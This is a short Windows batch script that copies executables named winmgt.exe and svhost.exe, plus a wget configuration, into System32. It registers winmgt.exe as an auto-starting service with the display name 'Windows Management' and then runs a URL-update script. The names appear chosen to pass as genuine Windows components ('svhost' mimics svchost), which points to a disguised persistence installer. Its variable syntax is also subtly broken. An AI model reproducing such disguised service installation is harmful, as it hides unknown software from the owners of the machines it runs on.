rem $Id$
@echo off


rem copy all files
copy winmgt.exe %SystemRoot%\System32
copy svhost.exe %SystemRoot%\System32
copy .wgetrc %SystemRoot%\System32

rem unregister service
sc stop winmgt
sc delete winmgt

rem register service
set tmp_full_path=$SystemRoot$\System32\winmgt.exe
sc create winmgt binpath= $tmp_full_path$ start= auto displayname= "Windows Management" depend= tcpip obj= "NT AUTHORITY\LocalService"

rem copy URLs file
update_urls.cmd